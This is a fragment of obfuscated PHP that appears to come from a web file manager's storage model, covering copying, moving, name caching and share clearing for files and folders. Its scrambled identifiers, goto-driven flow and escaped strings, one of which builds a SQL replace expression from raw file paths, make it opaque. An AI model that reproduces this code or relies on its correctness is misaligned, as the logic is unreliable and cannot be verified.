$_SERVER[Ö¹ñÒÁ²÷]; $f¬ÕÌßÜœÈ = $this->sourceInfoCache($f³îõïÆ); $cÂÆŠ£¬® = $this->sourceInfoCache($C¸È“¶öÒĞ); goto aÎºŞßÃ¢Î; dÉ„ˆ…°î: $bÅÜİ‹ç¿[$f³îõïÆ] = $cÓƒä²Ùà; $A¢º´Û‘´é = array(); $Cç´ö¢àˆ = array(); goto eÁÛÒ¡¹Â; CÎ¤°œ±Æ¬: $this->chunkEventSet($CÜÆ§ãÏµ[511], array($CÜÆ§ãÏµ[512], $e÷ø‡‡½ºÕ, $CŠØÎÒ¹¼…)); $this->saveAll($Cç´ö¢àˆ); return $cÓƒä²Ùà; goto CÁ»§×í©É; f×ËùËÈ: if ($f¬ÕÌßÜœÈ[$CÜÆ§ãÏµ[366]] != $CÜÆ§ãÏµ[83]) { $c†ÈÑ‘šò[$CÜÆ§ãÏµ[497]][] = $f¬ÕÌßÜœÈ[$CÜÆ§ãÏµ[415]]; return $cÓƒä²Ùà; } $EíÄÃ”ùÒí = array(); $bÂ¤¸¾éÄ = array(); goto e—‰”í«; eÁÛÒ¡¹Â: foreach ($cŞ£ÜŸç£¨ as $bÃÚ‘Ñ¯Üä) { $E’¸‹§§‡† = $bÃÚ‘Ñ¯Üä[$CÜÆ§ãÏµ[365]]; $f™¥‡èà¡ = $this->_childrenMatch($bÅÜİ‹ç¿, $bÃÚ‘Ñ¯Üä, $d¾¢…”µ); $A¢º´Û‘´é[] = array($CÜÆ§ãÏµ[365], $E’¸‹§§‡†, $CÜÆ§ãÏµ[457], $f™¥‡èà¡[$CÜÆ§ãÏµ[457]]); $Cç´ö¢àˆ[] = array($CÜÆ§ãÏµ[365], $E’¸‹§§‡†, $CÜÆ§ãÏµ[455], $f™¥‡èà¡[$CÜÆ§ãÏµ[455]]); $this->_copyApplyMeta($bÃÚ‘Ñ¯Üä, $c†ÈÑ‘šò); if ($bÃÚ‘Ñ¯Üä[$CÜÆ§ãÏµ[366]] != $CÜÆ§ãÏµ[83]) { $c†ÈÑ‘šò[$CÜÆ§ãÏµ[497]][] = $bÃÚ‘Ñ¯Üä[$CÜÆ§ãÏµ[415]]; } } $this->chunkEventSet($CÜÆ§ãÏµ[509], array($CÜÆ§ãÏµ[510], $e÷ø‡‡½ºÕ, $CŠØÎÒ¹¼…)); $this->saveAll($A¢º´Û‘´é); goto CÎ¤°œ±Æ¬; aÎºŞßÃ¢Î: $e÷ø‡‡½ºÕ = $this->_makeItemData($f¬ÕÌßÜœÈ, $cÂÆŠ£¬®, $B¾¤‹ÂßëÜ); Hook::trigger($CÜÆ§ãÏµ[504], $e÷ø‡‡½ºÕ); Hook::trigger($CÜÆ§ãÏµ[505], array($CÜÆ§ãÏµ[506], $e÷ø‡‡½ºÕ, 0)); goto aÍ†¢ŞÑæØ; e—‰”í«: $this->_childrenListAll($f³îõïÆ, $EíÄÃ”ùÒí); $CŠØÎÒ¹¼… = count($EíÄÃ”ùÒí); if ($CŠØÎÒ¹¼… == 0) { return $cÓƒä²Ùà; } goto aÍíÒÔ×‚; a¢£ò‚„ä: $this->addAll($bÂ¤¸¾éÄ, array(), !1); $cŞ£ÜŸç£¨ = $this->where(array($CÜÆ§ãÏµ[457] => $cÓƒä²Ùà))->select(); $bÅÜİ‹ç¿ = $this->_childrenMakeRelation($EíÄÃ”ùÒí, $cŞ£ÜŸç£¨); goto dÉ„ˆ…°î; aÍ†¢ŞÑæØ: $cÓƒä²Ùà = $this->add($e÷ø‡‡½ºÕ); $b‡â—ÖŒÁ  = array($CÜÆ§ãÏµ[365] => $cÓƒä²Ùà, $CÜÆ§ãÏµ[28] => $B¾¤‹ÂßëÜ); $this->_copyApplyMeta($b‡â—ÖŒÁ , $c†ÈÑ‘šò); goto f×ËùËÈ; aÍíÒÔ×‚: $d¾¢…”µ = $this->sourceInfo($cÓƒä²Ùà); foreach ($EíÄÃ”ùÒí as $bÃÚ‘Ñ¯Üä) { $B«Ö‹œŞøï = $this->_makeItemData($bÃÚ‘Ñ¯Üä, $d¾¢…”µ, $bÃÚ‘Ñ¯Üä[$CÜÆ§ãÏµ[28]]); $B«Ö‹œŞøï[$CÜÆ§ãÏµ[455]] = $bÃÚ‘Ñ¯Üä[$CÜÆ§ãÏµ[455]]; $bÂ¤¸¾éÄ[] = $B«Ö‹œŞøï; } $this->chunkEventSet($CÜÆ§ãÏµ[507], array($CÜÆ§ãÏµ[508], $e÷ø‡‡½ºÕ, $CŠØÎÒ¹¼…)); goto a¢£ò‚„ä; CÁ»§×í©É: } private function _childrenMakeRelation($a’¥¤ÂÆÌÏ, $cÒ„™¿Èù) { $d÷è–±÷ =& $_SERVER[Ö¹ñÒÁ²÷]; $eˆŠ÷Ù»ˆõ = array(); $dáóóã¼ª = array(); foreach ($a’¥¤ÂÆÌÏ as $dª¦˜’ÏÈ‰) { $Dºœ¾²Ò Ò = $dª¦˜’ÏÈ‰[$d÷è–±÷[28]] . $d÷è–±÷[8] . $dª¦˜’ÏÈ‰[$d÷è–±÷[455]]; $eˆŠ÷Ù»ˆõ[$Dºœ¾²Ò Ò] = $dª¦˜’ÏÈ‰[$d÷è–±÷[365]]; } foreach ($cÒ„™¿Èù as $dª¦˜’ÏÈ‰) { $Dºœ¾²Ò Ò = $dª¦˜’ÏÈ‰[$d÷è–±÷[28]] . $d÷è–±÷[8] . $dª¦˜’ÏÈ‰[$d÷è–±÷[455]]; $a¶Ô‰ÓÍ„  = $eˆŠ÷Ù»ˆõ[$Dºœ¾²Ò Ò]; $dáóóã¼ª[$a¶Ô‰ÓÍ„ ] = $dª¦˜’ÏÈ‰[$d÷è–±÷[365]]; } return $dáóóã¼ª; } private function _childrenMatch($EÀ–ç«©¶Æ, $f°¨Ø†É†¤, $DÙçØ×ó‘) { goto b‡šÜñ»; b‡šÜñ»: $Aë‹‡­‰¬ª =& $_SERVER[Ö¹ñÒÁ²÷]; $F£©—ä©Àä = $DÙçØ×ó‘[$Aë‹‡­‰¬ª[455]]; $EˆÑöÛò™‹ = $this->parentLevelArray($f°¨Ø†É†¤[$Aë‹‡­‰¬ª[455]]); goto D£Ï ¯°“˜; D£Ï ¯°“˜: foreach ($EˆÑöÛò™‹ as $F³ôªÙìĞÊ) { if (isset($EÀ–ç«©¶Æ[$F³ôªÙìĞÊ])) { $F£©—ä©Àä .= $EÀ–ç«©¶Æ[$F³ôªÙìĞÊ] . $Aë‹‡­‰¬ª[513]; } } $F£©—ä©Àä = rtrim($F£©—ä©Àä, $Aë‹‡­‰¬ª[47]) . $Aë‹‡­‰¬ª[47]; $f±¥¢ˆœåÇ = $this->parentLevelArray($F£©—ä©Àä); goto eğ¾ì„Ç†; eğ¾ì„Ç†: $b–šÖ¯åŠî = $f±¥¢ˆœåÇ[count($f±¥¢ˆœåÇ) - 1]; return array($Aë‹‡­‰¬ª[457] => $b–šÖ¯åŠî, $Aë‹‡­‰¬ª[455] => $F£©—ä©Àä); goto bÍñ”Ù–·³; bÍñ”Ù–·³: } private function _makeItemData($FÆ¬Æ›šé, $f“Û’Éµ‡ø, $Eª§ŞŠ°Âº) { $a— ®¦æ¡ =& $_SERVER[Ö¹ñÒÁ²÷]; $AÔæïÇèÃ = array($a— ®¦æ¡[514] => $FÆ¬Æ›šé[$a— ®¦æ¡[366]], $a— ®¦æ¡[382] => $Eª§ŞŠ°Âº, $a— ®¦æ¡[515] => $FÆ¬Æ›šé[$a— ®¦æ¡[368]], $a— ®¦æ¡[416] => $FÆ¬Æ›šé[$a— ®¦æ¡[415]], $a— ®¦æ¡[516] => $FÆ¬Æ›šé[$a— ®¦æ¡[77]], $a— ®¦æ¡[517] => $f“Û’Éµ‡ø[$a— ®¦æ¡[367]], $a— ®¦æ¡[518] => $f“Û’Éµ‡ø[$a— ®¦æ¡[452]], $a— ®¦æ¡[519] => USER_ID, $a— ®¦æ¡[520] => USER_ID, $a— ®¦æ¡[364] => $f“Û’Éµ‡ø[$a— ®¦æ¡[365]], $a— ®¦æ¡[521] => $f“Û’Éµ‡ø[$a— ®¦æ¡[455]] . $f“Û’Éµ‡ø[$a— ®¦æ¡[365]] . $a— ®¦æ¡[47], $a— ®¦æ¡[392] => 0, $a— ®¦æ¡[522] => $a— ®¦æ¡[33]); return $AÔæïÇèÃ; } private function _copyApplyMeta($A‚”İëƒñ, &$eˆ¸í´ß«¦) { $EÑãÙŠ¨­æ =& $_SERVER[Ö¹ñÒÁ²÷]; $FÍëÎÚ¦ĞÚ = $A‚”İëƒñ[$EÑãÙŠ¨­æ[365]]; $fæ›á¸ Áİ = $A‚”İëƒñ[$EÑãÙŠ¨­æ[28]]; if (!isset($A‚”İëƒñ[$EÑãÙŠ¨­æ[523]]) || !$A‚”İëƒñ[$EÑãÙŠ¨­æ[523]] || $A‚”İëƒñ[$EÑãÙŠ¨­æ[523]] == $EÑãÙŠ¨­æ[464]) { $eˆ¸í´ß«¦[$EÑãÙŠ¨­æ[499]][] = array($EÑãÙŠ¨­æ[365], $FÍëÎÚ¦ĞÚ, $EÑãÙŠ¨­æ[523], short_id($FÍëÎÚ¦ĞÚ)); } if (Input::check($fæ›á¸ Áİ, $EÑãÙŠ¨­æ[524])) { $eˆ¸í´ß«¦[$EÑãÙŠ¨­æ[498]][] = array($EÑãÙŠ¨­æ[365] => $FÍëÎÚ¦ĞÚ, $EÑãÙŠ¨­æ[89] => $EÑãÙŠ¨­æ[412], $EÑãÙŠ¨­æ[355] => str_replace($EÑãÙŠ¨­æ[50], $EÑãÙŠ¨­æ[33], Pinyin::encode($fæ›á¸ Áİ))); $eˆ¸í´ß«¦[$EÑãÙŠ¨­æ[498]][] = array($EÑãÙŠ¨­æ[365] => $FÍëÎÚ¦ĞÚ, $EÑãÙŠ¨­æ[89] => $EÑãÙŠ¨­æ[411], $EÑãÙŠ¨­æ[355] => Pinyin::encode($fæ›á¸ Áİ, $EÑãÙŠ¨­æ[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Aà–¿ÊÜâÇ) { goto A„èäİ¸º; c²¦„† Ò: $E ¸·—Ùİ = array_to_keyvalue($E ¸·—Ùİ, $BÔÂò¾®Ï[365]); foreach ($E ¸·—Ùİ as $aöŸïÆµ) { $Dîçã²á½ = $aöŸïÆµ[$BÔÂò¾®Ï[457]]; $Aà–¿ÊÜâÇ = $aöŸïÆµ[$BÔÂò¾®Ï[365]]; if (!isset($this->_childrenListCache[$Aà–¿ÊÜâÇ]) && $aöŸïÆµ[$BÔÂò¾®Ï[366]] == $BÔÂò¾®Ï[83]) { $this->_childrenListCache[$Aà–¿ÊÜâÇ] = array(); } if (!isset($this->_childrenListCache[$Dîçã²á½])) { $this->_childrenListCache[$Dîçã²á½] = array(); } $this->_childrenListCache[$Dîçã²á½][$Aà–¿ÊÜâÇ] = $aöŸïÆµ; $this->_childrenItemCache[$Aà–¿ÊÜâÇ] = $aöŸïÆµ; } goto Däß‰ÅøÈ¦; bÄ°æ¿ó‡: $E‡Ú–±¸… = array($BÔÂò¾®Ï[455] => array($BÔÂò¾®Ï[479], $fóÔ‘áæ[$BÔÂò¾®Ï[455]] . $Aà–¿ÊÜâÇ . $BÔÂò¾®Ï[480]), $BÔÂò¾®Ï[393] => $this->targetIsDelete); $E ¸·—Ùİ = $this->field($dƒ¡­»¬õñ)->where($E‡Ú–±¸…)->select(); if (!$E ¸·—Ùİ) { return; } goto c²¦„† Ò; A„èäİ¸º: $BÔÂò¾®Ï =& $_SERVER[Ö¹ñÒÁ²÷]; $fóÔ‘áæ = $this->sourceInfo($Aà–¿ÊÜâÇ); $dƒ¡­»¬õñ = $BÔÂò¾®Ï[526]; goto bÄ°æ¿ó‡; Däß‰ÅøÈ¦: } private function _childrenListAll($dˆ˜·°ï‡Â, &$DÁé«ÙÄ) { $b•Ô¯Ğí¯Ÿ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($this->_childrenListCache[$dˆ˜·°ï‡Â])) { return; } $f”“ª¢’Ñ— = $this->_childrenListCache[$dˆ˜·°ï‡Â]; foreach ($f”“ª¢’Ñ— as $FìÂ•Æ†»  => $cÛçÉÑñ¸Ù) { $DÁé«ÙÄ[$FìÂ•Æ†» ] = $cÛçÉÑñ¸Ù; if ($cÛçÉÑñ¸Ù[$b•Ô¯Ğí¯Ÿ[366]] == $b•Ô¯Ğí¯Ÿ[83]) { $this->_childrenListAll($FìÂ•Æ†» , $DÁé«ÙÄ); } } } private function sourceInfoCache($cÚÄ“ƒˆà—) { if (isset($this->_childrenItemCache[$cÚÄ“ƒˆà—])) { return $this->_childrenItemCache[$cÚÄ“ƒˆà—]; } return $this->sourceInfo($cÚÄ“ƒˆà—); } private function _childrenList($Cµîõ³‚‘) { if (isset($this->_childrenListCache[$Cµîõ³‚‘])) { return $this->_childrenListCache[$Cµîõ³‚‘]; } return $this->_childrenListSelect($Cµîõ³‚‘); } private function _childrenListSelect($Fª–¿Õ¸´) { goto A‡Ã½é´ä­; A‡Ã½é´ä­: $bÀõåÀİ¯Ê =& $_SERVER[Ö¹ñÒÁ²÷]; $E°«ç‰½­ = array($bÀõåÀİ¯Ê[457] => $Fª–¿Õ¸´, $bÀõåÀİ¯Ê[393] => $this->targetIsDelete); $C¯ƒ°Î‡ùò = $this->where($E°«ç‰½­)->select(); goto eå ±ÆÊùÛ; eå ±ÆÊùÛ: $C¯ƒ°Î‡ùò = $C¯ƒ°Î‡ùò ? $C¯ƒ°Î‡ùò : array(); $Aìœª÷õÍ‡ = array_to_keyvalue($C¯ƒ°Î‡ùò, $bÀõåÀİ¯Ê[365]); $this->_childrenListCache[$Fª–¿Õ¸´] = $Aìœª÷õÍ‡; goto eÓñ±¡î¥Î; eÓñ±¡î¥Î: foreach ($Aìœª÷õÍ‡ as $Fª–¿Õ¸´ => $aá³¦Ùö©) { $this->_childrenItemCache[$Fª–¿Õ¸´] = $aá³¦Ùö©; } return $Aìœª÷õÍ‡; goto DÇ“‰Ç°ß­; DÇ“‰Ç°ß­: } private function fileNameExistCache($eí°ÀñäÏ—, $CéºÆø¶´¡) { $dßÉŒ™£øï =& $_SERVER[Ö¹ñÒÁ²÷]; $CéºÆø¶´¡ = strtolower($CéºÆø¶´¡); $DÌÚŒ‹—§ = $this->_childrenList($eí°ÀñäÏ—); foreach ($DÌÚŒ‹—§ as $e¬¦×ğÜõ) { if ($CéºÆø¶´¡ == strtolower($e¬¦×ğÜõ[$dßÉŒ™£øï[28]])) { return $e¬¦×ğÜõ[$dßÉŒ™£øï[365]]; } } return !1; } private function fileNameAutoCache($C¦»Ç‰¸è, $CÕ¾¿ğŒµ, $dªŒŞˆÚ›º, $e–§œç¥„ô) { $câ¶•„Œà… =& $_SERVER[Ö¹ñÒÁ²÷]; $E÷Ò‘Ñ‹µø = $this->_childrenList($C¦»Ç‰¸è); $C´ÛĞ¬Ãµ = array_to_keyvalue($E÷Ò‘Ñ‹µø, $câ¶•„Œà…[33], $câ¶•„Œà…[28]); return $this->fileNameAutoGet($C´ÛĞ¬Ãµ, $CÕ¾¿ğŒµ, $dªŒŞˆÚ›º, $e–§œç¥„ô); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($C½×ÌÛ£²¢, $BÇÈìÙî„, $e§ÕÔ·šĞ÷ = REPEAT_REPLACE, $eùÊÌæñª¬ = '') { goto B´‰ŠëÊ; fäÕùÍÊ±: $A°‚İŒÇ† = array($CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[457]], $BÇÈìÙî„); if ($CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[366]] == $b‚ÊÆÓ´É¶[83]) { $A°‚İŒÇ†[] = $C½×ÌÛ£²¢; } $this->updateModifyTime($A°‚İŒÇ†); goto C‚Ïâ‰ÙÉ; EÕ†ãà”Ò: Hook::trigger($b‚ÊÆÓ´É¶[527], $Dê†æù†ğ˜); $this->targetIsDelete = intval($CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[393]]); if ($CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[457]] == $BÇÈìÙî„ && $eùÊÌæñª¬ != $CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[28]]) { $aˆ˜©Î³èò = $this->fileNameExist($BÇÈìÙî„, $eùÊÌæñª¬); if ($aˆ˜©Î³èò && $CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[366]] == $b‚ÊÆÓ´É¶[464]) { goto DÖŒÏÒª­µ; FÍ÷±Äñ: $this->removeNow($C½×ÌÛ£²¢, !1); $this->folderSizeReset($BÇÈìÙî„); Hook::trigger($b‚ÊÆÓ´É¶[528], $Dê†æù†ğ˜); goto A¨ÂºÚ‰‰; A¨ÂºÚ‰‰: return $aˆ˜©Î³èò; goto fµ÷ø¿ê˜; DÖŒÏÒª­µ: $d®ÆãõÕè´ = $this->sourceInfo($aˆ˜©Î³èò); $e¾í°„­Ÿ = $this->fileHistory($d®ÆãõÕè´, $CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[415]], $CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[77]]); if (!$e¾í°„­Ÿ) { Model($b‚ÊÆÓ´É¶[418])->remove($CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[415]]); } goto FÍ÷±Äñ; fµ÷ø¿ê˜: } } goto FÓÖ‘…İ; D¦î“…¿²: Model($b‚ÊÆÓ´É¶[163])->linkAdd($e‡ÑÒÔÎ§[$b‚ÊÆÓ´É¶[497]]); if ($F™‹¤çí½† && $e‡ÑÒÔÎ§[$b‚ÊÆÓ´É¶[529]]) { $this->removeNow($C½×ÌÛ£²¢, !1); } $this->lockMoveEnd($C½×ÌÛ£²¢); goto dÜÚ ‚©ÕŒ; e¢îõŒ‹¨„: $e‡ÑÒÔÎ§ = array($b‚ÊÆÓ´É¶[497] => array(), $b‚ÊÆÓ´É¶[529] => !1); $this->clearShare($C½×ÌÛ£²¢, $BÇÈìÙî„); $F™‹¤çí½† = $this->fileNameExistCache($BÇÈìÙî„, $CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[28]]); goto d¢ßŒ£éÂ¿; FÓÖ‘…İ: $CéÓ’Í­ã³ = $eùÊÌæñª¬ ? $eùÊÌæñª¬ : $CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[28]]; $this->lockMoveStart($C½×ÌÛ£²¢); $this->lockWriteStart($BÇÈìÙî„, $CéÓ’Í­ã³); goto e¢îõŒ‹¨„; d¢ßŒ£éÂ¿: $Bí÷ÉèäŠ = $this->_move($C½×ÌÛ£²¢, $BÇÈìÙî„, $e§ÕÔ·šĞ÷, $e‡ÑÒÔÎ§, $eùÊÌæñª¬); $this->sourceCacheClear(); if ($CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[366]] == $b‚ÊÆÓ´É¶[83] && $F™‹¤çí½†) { $this->folderSizeResetChildren($Bí÷ÉèäŠ); } goto D¦î“…¿²; C‚Ïâ‰ÙÉ: Model($b‚ÊÆÓ´É¶[501])->eventMove($C½×ÌÛ£²¢, $CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[457]], $BÇÈìÙî„); Hook::trigger($b‚ÊÆÓ´É¶[528], $Dê†æù†ğ˜); return $Bí÷ÉèäŠ; goto dò‘ªª²ƒ“; dÜÚ ‚©ÕŒ: $this->lockWriteEnd($BÇÈìÙî„, $CéÓ’Í­ã³); $this->folderSizeReset($CõŞÀŸ†š„[$b‚ÊÆÓ´É¶[457]]); $this->folderSizeReset($BÇÈìÙî„); goto fäÕùÍÊ±; B´‰ŠëÊ: $b‚ÊÆÓ´É¶ =& $_SERVER[Ö¹ñÒÁ²÷]; $CõŞÀŸ†š„ = $this->sourceInfo($C½×ÌÛ£²¢); $c’‹öÁ’‰ë = $this->sourceInfo($BÇÈìÙî„); goto EÇË¯…´ë; EÇË¯…´ë: $Dê†æù†ğ˜ = $this->pathInfoMore($C½×ÌÛ£²¢); if ($this->isParentOf($C½×ÌÛ£²¢, $BÇÈìÙî„)) { return !1; } if (!$CõŞÀŸ†š„ || !$c’‹öÁ’‰ë || $c’‹öÁ’‰ë[$b‚ÊÆÓ´É¶[366]] != $b‚ÊÆÓ´É¶[83]) { return !1; } goto EÕ†ãà”Ò; dò‘ªª²ƒ“: } private function _move($FÃÀ¢–›ÓÁ, $eë²ãÌ£Ó°, $bä‰¥ÖÅ¢–, &$b‹¯à¬¶Ù¡, $aÎÖÏé‹× = '') { goto FÎ¡“‹È÷; fÂ®ì‰¨‡: $cĞ Üœº÷ = !1; if ($BÏ¦÷à…‡‹) { if ($bä‰¥ÖÅ¢– == REPEAT_RENAME_FOLDER) { $cÒ©İ²ô = $this->fileNameAuto($eë²ãÌ£Ó°, $cÒ©İ²ô, $bä‰¥ÖÅ¢–, $BÏ¦÷à…‡‹); $d«ìÏé¤ = $this->_moveForce($FÃÀ¢–›ÓÁ, $eë²ãÌ£Ó°, $cÒ©İ²ô); } else { if ($bä‰¥ÖÅ¢– == REPEAT_RENAME_FOLDER) { $bä‰¥ÖÅ¢– = REPEAT_RENAME; } $bÂ›îİõ = $this->_childrenListSelect($FÃÀ¢–›ÓÁ); foreach ($bÂ›îİõ as $B¥ ›•¥‡Å) { $this->_move($B¥ ›•¥‡Å[$dœË‹¦ ¸Ô[365]], $AÇ×¦èÀ±å, $bä‰¥ÖÅ¢–, $b‹¯à¬¶Ù¡); } $cĞ Üœº÷ = !0; } } else { if ($bä‰¥ÖÅ¢– == REPEAT_SKIP) { $cĞ Üœº÷ = !0; } else { if ($bä‰¥ÖÅ¢– == REPEAT_RENAME || $bä‰¥ÖÅ¢– == REPEAT_RENAME_FOLDER) { $cÒ©İ²ô = $this->fileNameAuto($eë²ãÌ£Ó°, $cÒ©İ²ô, $bä‰¥ÖÅ¢–, $BÏ¦÷à…‡‹); $d«ìÏé¤ = $this->_moveForce($FÃÀ¢–›ÓÁ, $eë²ãÌ£Ó°, $cÒ©İ²ô); } else { if ($bä‰¥ÖÅ¢– == REPEAT_REPLACE) { $DõÚ—ÓÅé½ = $this->sourceInfoCache($AÇ×¦èÀ±å); $cõ¹®áåì = $this->fileHistory($DõÚ—ÓÅé½, $c˜º¡ÕïÂÖ[$dœË‹¦ ¸Ô[415]], $c˜º¡ÕïÂÖ[$dœË‹¦ ¸Ô[77]]); if ($cõ¹®áåì) { $b‹¯à¬¶Ù¡[$dœË‹¦ ¸Ô[497]][] = $c˜º¡ÕïÂÖ[$dœË‹¦ ¸Ô[415]]; } else { $cĞ Üœº÷ = !0; } } } } } if ($cĞ Üœº÷ && !$b‹¯à¬¶Ù¡[$dœË‹¦ ¸Ô[529]]) { $b‹¯à¬¶Ù¡[$dœË‹¦ ¸Ô[529]] = !0; } goto E° ¶Ø°ßõ; B†Ò³ß èì: $cÒ©İ²ô = $aÎÖÏé‹× ? $aÎÖÏé‹× : $c˜º¡ÕïÂÖ[$dœË‹¦ ¸Ô[28]]; $AÇ×¦èÀ±å = $this->fileNameExistCache($eë²ãÌ£Ó°, $cÒ©İ²ô); $this->lockMoveStart($FÃÀ¢–›ÓÁ); goto fãù¬²‹İÑ; fãù¬²‹İÑ: $this->lockWriteStart($eë²ãÌ£Ó°, $cÒ©İ²ô); if (!$AÇ×¦èÀ±å) { return $this->_moveForce($FÃÀ¢–›ÓÁ, $eë²ãÌ£Ó°, $cÒ©İ²ô); } $d«ìÏé¤ = $AÇ×¦èÀ±å; goto fÂ®ì‰¨‡; FÎ¡“‹È÷: $dœË‹¦ ¸Ô =& $_SERVER[Ö¹ñÒÁ²÷]; $c˜º¡ÕïÂÖ = $this->sourceInfo($FÃÀ¢–›ÓÁ); $BÏ¦÷à…‡‹ = $c˜º¡ÕïÂÖ[$dœË‹¦ ¸Ô[366]] == $dœË‹¦ ¸Ô[83]; goto B†Ò³ß èì; E° ¶Ø°ßõ: return $d«ìÏé¤; goto B¤Ä²¼‹ï; B¤Ä²¼‹ï: } private function _moveForce($Dñ¢¸¿…˜«, $däÕµŸÇÍ, $B±ØŒŠõÈ) { goto F™¡³Ñ¥ ©; bĞ±¹“ÜŒ: if (!$C‹‚•Ë¥Š) { Model($A¨ÓéÈô×[450])->authClear($Dñ¢¸¿…˜«); } $A‡ÅôÍ¾‘ = $eí»İÖöòœ[$A¨ÓéÈô×[393]] == $A¨ÓéÈô×[83] && $DåÏóùÔçö[$A¨ÓéÈô×[393]] != $A¨ÓéÈô×[83]; if ($A‡ÅôÍ¾‘) { $fºéîŒ’•[$A¨ÓéÈô×[392]] = 0; } goto D•°Ë»Æ¼Ö; F™¡³Ñ¥ ©: $A¨ÓéÈô× =& $_SERVER[Ö¹ñÒÁ²÷]; $eí»İÖöòœ = $this->sourceInfo($Dñ¢¸¿…˜«); $DåÏóùÔçö = $this->sourceInfo($däÕµŸÇÍ); goto EöØ»‡„ˆÃ; EöØ»‡„ˆÃ: $c‡«›“ˆğ = $eí»İÖöòœ[$A¨ÓéÈô×[366]] == $A¨ÓéÈô×[83]; $fºéîŒ’• = array($A¨ÓéÈô×[364] => $DåÏóùÔçö[$A¨ÓéÈô×[365]], $A¨ÓéÈô×[521] => $DåÏóùÔçö[$A¨ÓéÈô×[455]] . $DåÏóùÔçö[$A¨ÓéÈô×[365]] . $A¨ÓéÈô×[47], $A¨ÓéÈô×[517] => $DåÏóùÔçö[$A¨ÓéÈô×[367]], $A¨ÓéÈô×[518] => $DåÏóùÔçö[$A¨ÓéÈô×[452]], $A¨ÓéÈô×[520] => USER_ID, $A¨ÓéÈô×[382] => $B±ØŒŠõÈ); $C‹‚•Ë¥Š = $eí»İÖöòœ[$A¨ÓéÈô×[367]] == SourceModel::TYPE_GROUP && $DåÏóùÔçö[$A¨ÓéÈô×[367]] == SourceModel::TYPE_GROUP && $eí»İÖöòœ[$A¨ÓéÈô×[452]] == $DåÏóùÔçö[$A¨ÓéÈô×[452]]; goto bĞ±¹“ÜŒ; D•°Ë»Æ¼Ö: if ($c‡«›“ˆğ) { $Càêø¢»àé = array($A¨ÓéÈô×[521] => array($A¨ÓéÈô×[479], $eí»İÖöòœ[$A¨ÓéÈô×[455]] . $eí»İÖöòœ[$A¨ÓéÈô×[365]] . $A¨ÓéÈô×[480])); $c‚İ°ğµö° = $eí»İÖöòœ[$A¨ÓéÈô×[455]] . $eí»İÖöòœ[$A¨ÓéÈô×[365]] . $A¨ÓéÈô×[47]; $c½š¶ññ˜› = $DåÏóùÔçö[$A¨ÓéÈô×[455]] . $DåÏóùÔçö[$A¨ÓéÈô×[365]] . $A¨ÓéÈô×[47] . $eí»İÖöòœ[$A¨ÓéÈô×[365]] . $A¨ÓéÈô×[47]; $d®ŸòÂ¨¶š = array($A¨ÓéÈô×[521] => array($A¨ÓéÈô×[530], "\162\145\x70\x6c\141\x63\145\50\160\x61\162\x65\156\164\114\x65\166\145\x6c\54\47{$c‚İ°ğµö°}\x27\54\x27{$c½š¶ññ˜›}\x27\x29"), $A¨ÓéÈô×[517] => $DåÏóùÔçö[$A¨ÓéÈô×[367]], $A¨ÓéÈô×[518] => $DåÏóùÔçö[$A¨ÓéÈô×[452]]); if ($A‡ÅôÍ¾‘) { $d®ŸòÂ¨¶š[$A¨ÓéÈô×[392]] = 0; } $this->where($Càêø¢»àé)->data($d®ŸòÂ¨¶š)->save(); } $this->where(array($A¨ÓéÈô×[379] => $Dñ¢¸¿…˜«))->data($fºéîŒ’•)->save(); return $Dñ¢¸¿…˜«; goto a²‡ÖÛ ö–; a²‡ÖÛ ö–: } private function clearShare($Aäƒ˜Ë¼à‹, $F—î›ÀÜé ) { goto C‰‡ÙãêæÌ; d¥ñÜÎÔ±ó: if (!$EÀ¼ùÇ¢Ü¢) { return; } $bŒ‘ö™ÏÕ… = array($d¬›ÅƒïÓÖ[365] => array($d¬›ÅƒïÓÖ[7], $EÀ¼ùÇ¢Ü¢), $d¬›ÅƒïÓÖ[444] => 1); $AøªÑŸ¶÷Ì = Model($d¬›ÅƒïÓÖ[532])->field($d¬›ÅƒïÓÖ[437])->where($bŒ‘ö™ÏÕ…)->select(); goto d…„…ã¾öº; d…„…ã¾öº: if (!$AøªÑŸ¶÷Ì) { return; } $AøªÑŸ¶÷Ì = array_to_keyvalue($AøªÑŸ¶÷Ì, $d¬›ÅƒïÓÖ[33], $d¬›ÅƒïÓÖ[437]); $bŒ‘ö™ÏÕ… = array($d¬›ÅƒïÓÖ[437] => array($d¬›ÅƒïÓÖ[7], $AøªÑŸ¶÷Ì)); goto B„†²Ğå¾; C‰‡ÙãêæÌ: $d¬›ÅƒïÓÖ =& $_SERVER[Ö¹ñÒÁ²÷]; $e‚ÓÓåÁÌ = $this->sourceInfo($Aäƒ˜Ë¼à‹); $EÈË˜â£¯Ç = $this->sourceInfo($F—î›ÀÜé ); goto f¾‰İÃÕ‡©; f¾‰İÃÕ‡©: if ($e‚ÓÓåÁÌ[$d¬›ÅƒïÓÖ[452]] == $EÈË˜â£¯Ç[$d¬›ÅƒïÓÖ[452]] && $e‚ÓÓåÁÌ[$d¬›ÅƒïÓÖ[367]] == $d¬›ÅƒïÓÖ[531]) { return; } $bŒ‘ö™ÏÕ… = array($d¬›ÅƒïÓÖ[455] => array($d¬›ÅƒïÓÖ[479], $e‚ÓÓåÁÌ[$d¬›ÅƒïÓÖ[455]] . $Aäƒ˜Ë¼à‹ . $d¬›ÅƒïÓÖ[480])); $EÀ¼ùÇ¢Ü¢ = $this->field($d¬›ÅƒïÓÖ[379])->where($bŒ‘ö™ÏÕ…)->getField($d¬›ÅƒïÓÖ[365], !0); goto d¥ñÜÎÔ±ó; B„†²Ğå¾: 